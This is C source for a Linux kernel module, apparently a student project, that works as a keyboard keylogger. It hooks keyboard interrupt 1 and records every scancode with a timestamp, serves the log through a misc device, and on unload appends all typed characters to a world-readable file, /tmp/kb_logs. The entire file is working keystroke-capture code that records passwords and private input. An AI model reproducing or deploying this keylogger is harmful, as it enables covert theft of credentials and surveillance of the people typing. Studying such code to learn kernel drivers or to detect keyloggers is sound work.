#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/seq_file.h>
#include <linux/file.h>
#include <linux/fcntl.h>
#include <linux/syscalls.h>

#include <asm/uaccess.h>
#include <linux/mm.h>
#include <linux/delay.h>

#include "struct.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Adam Taguirov <ataguiro@student.42.fr>");
MODULE_DESCRIPTION("Keyboard interrupt handler");

static char *read_buffer = NULL;
static struct miscdevice kbhandler;
static unsigned char sc;
static void *my_data = NULL;
static unsigned char destroy_request = 0;
static unsigned char inout = 0;

static unsigned char stop_interrupt = 0;

static void got_char(unsigned long scancode_addr);

DECLARE_TASKLET(kbtask, got_char, (unsigned long)&sc);

/*
 * DEFINE_RWLOCK(array_lock);
 * DEFINE_RWLOCK(misc_lock);
 */

DEFINE_RWLOCK(misc_lock);
DEFINE_RWLOCK(open_lock);

/*
 * static struct mutex g_mutex;
 */

/*
 * rwlock_t array_lock = RW_LOCK_UNLOCKED;
 * rwlock_t misc_lock = RW_LOCK_UNLOCKED;
 * rwlock_t open_lock = RW_LOCK_UNLOCKED;
 */

static struct file *file_open(const char *path, int flags, int rights)
{
	struct file *filp = NULL;
	mm_segment_t oldfs;

	oldfs = get_fs();
	set_fs(get_ds());

	filp = filp_open(path, flags, rights);

	set_fs(oldfs);
	if (IS_ERR(filp))
		return NULL;
	return filp;
}

static int file_write(struct file *file, loff_t *offset, unsigned char *data, unsigned int size)
{
	mm_segment_t oldfs;
	int ret;

	oldfs = get_fs();
	set_fs(get_ds());

	ret = kernel_write(file, data, size, offset);

	set_fs(oldfs);
	return ret;
}

static void file_close(struct file *file)
{
	filp_close(file, NULL);
}

static void got_char(unsigned long scancode_addr)
{
	static char multi = 0;
	static char caps = 0;
	static char state = 0;
	static struct s_stroke *new, *tmp;
	static struct tm time;
	static struct timespec ts;
	struct keycodes *array;
	unsigned char scancode = *(char *)scancode_addr;

	stop_interrupt = 1;
	if (scancode == 0xe0) {
		multi = 1;
		goto end;
	}
	if (!(new = kmalloc(sizeof(struct s_stroke), GFP_ATOMIC)))
		goto end;
	/*
	 * Setting correct flags and states
	 */
	if (scancode > 128) {
		scancode = scancode - 128;
		state = 0;
	} else
		state = 1;
	(0x2A == scancode && state) ? caps = 1 : 0;
	(0x2A == scancode && !state) ? caps = 0 : 0;
	(0x3A == scancode && state) ? caps = !caps : 0;
	array = multi ? multi_scancodes : simple_scancodes;

	/*
	 * Filling list node
	 */
	getnstimeofday(&ts);
	time_to_tm(ts.tv_sec, 0, &time);
	new->key = scancode;
	new->state = state;
	new->name = array[scancode].name;
	new->value = caps ? array[scancode].caps : array[scancode].ascii;
	new->print = array[scancode].print;
	new->multi = multi;
	new->time = time;
	new->next = NULL;

	/*
	 * Saving new list node at correct place
	 */
	read_lock(&misc_lock);
	if (!stroke_head)
		stroke_head = new;
	else {
		tmp = stroke_head;
		while (tmp->next)
			tmp = tmp->next;
		tmp->next = new;
	}
	read_unlock(&misc_lock);
	multi = 0;
end:
	stop_interrupt = 0;
}

irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs)
{
	sc = inb(0x60) % 256;
	if (stop_interrupt)
		goto end;
	tasklet_schedule(&kbtask);
end:
	return (irq_handler_t) IRQ_HANDLED;
}

static void write_logs(void)
{
	static loff_t offset = 0;
	struct s_stroke *tmp, *save;
	struct file *f;
	unsigned char c;
	unsigned int count[256] = {0};
	int i;

	tmp = stroke_head;
	f = file_open("/tmp/kb_logs", O_CREAT | O_WRONLY | O_APPEND, 0644);
	if (!f) {
		while (tmp) {
			save = tmp->next;
			kfree(tmp);
			tmp = save;
		}
		stroke_head = NULL;
		return ;
	}
	read_lock(&misc_lock);
	while (tmp)
	{
		if (tmp->print == 1 && tmp->state == 1) {
			c = tmp->value;
			count[c]++;
			file_write(f, &offset, &c, 1);
		}
		save = tmp->next;
		kfree(tmp);
		tmp = save;
	}
	stroke_head = NULL;
	read_unlock(&misc_lock);
	file_close(f);
	printk("Letters statistics\n");
	for (i = 0; i < 256; i++)
		if (count[i])
			printk("%c: %d times\n", i, count[i]);
}

static int get_count(void)
{
	struct s_stroke *tmp;
	char buf[256] = {0};
	int ret = 0, check = 0;

	tmp = stroke_head;
	read_lock(&misc_lock);
	while (tmp) {
		check = snprintf(buf, 256, "[%d:%d:%d] %s (%s%#x) %s\n", \
				tmp->time.tm_hour, tmp->time.tm_min, tmp->time.tm_sec, \
				tmp->name, \
				tmp->multi ? "0xe0, " : "", tmp->key, \
				tmp->state ? "pressed" : "released");
		if (check < 0)
			return 0;
		ret += strlen(buf);
		tmp = tmp->next;
	}
	read_unlock(&misc_lock);
	return ret;
}

static int kbopen(struct inode *inode, struct file *f)
{
	struct s_stroke *tmp;
	char buf[256] = {0};
	int n;
	int ret = -EFAULT;

	if (!f || destroy_request)
		goto end;
	inout = 1;
	f->private_data = NULL;
	tmp = stroke_head;
	n = get_count();
	if (!n)
		goto nullcase;
	read_lock(&open_lock);
	if (read_buffer)
		kfree(read_buffer);
	read_buffer = kmalloc(n * sizeof(char), GFP_KERNEL);
	if (!read_buffer) {
		ret = -ENOMEM;
		goto end;
	}
	memset(read_buffer, 0, n * sizeof(char));
	read_unlock(&open_lock);
	read_lock(&misc_lock);
	while (tmp) {
		if (destroy_request) {
			inout = 0;
			return -EFAULT;
		}
		snprintf(buf, 256, "[%d:%d:%d] %s (%s%#x) %s\n", \
				tmp->time.tm_hour, tmp->time.tm_min, tmp->time.tm_sec, \
				tmp->name, \
				tmp->multi ? "0xe0, " : "", tmp->key, \
				tmp->state ? "pressed" : "released");
		read_lock(&open_lock);
		strcat(read_buffer, buf);
		read_unlock(&open_lock);
		tmp = tmp->next;
	}
	read_unlock(&misc_lock);
	my_data = read_buffer;
nullcase:
	ret = single_open(f, NULL, NULL);
end:
	inout = 0;
	return ret;
}


static ssize_t kbread(struct file *f, char __user *s, size_t n, loff_t *o)
{
	int ret = -EAGAIN;

	if (!my_data || !s || !o || destroy_request)
		goto clean;
	read_lock(&open_lock);
	ret = simple_read_from_buffer(s, n, o, my_data, strlen(read_buffer));
	if (!ret)
		my_data = NULL;
	read_unlock(&open_lock);
clean:
	return ret;
}

struct file_operations kbfops = {
	.open = kbopen,
	.read = kbread
};

static int __init hello_init(void) {
	int ret;

	msleep(100);
	printk(KERN_INFO "Keyboard keylogger initialized !\n");
	kbhandler.minor = MISC_DYNAMIC_MINOR;
	kbhandler.name = "kbhandler";
	kbhandler.fops = &kbfops;

	if ((ret = misc_register(&kbhandler)))
		goto end;
	ret = request_irq (1, (irq_handler_t) irq_handler, IRQF_SHARED, "my_keyboard_driver", (void *)(irq_handler));
end:
	return ret;
}

static void __exit hello_cleanup(void) {
	printk(KERN_INFO "Destroying keylogger module.\n");
	destroy_request = 1;
	msleep(500);
	write_logs();
	if (read_buffer) {
		while (inout)
			;
		kfree(read_buffer);
		read_buffer = NULL;
	}
	misc_deregister(&kbhandler);
	free_irq(1, (void *)(irq_handler));
}

module_init(hello_init);
module_exit(hello_cleanup);
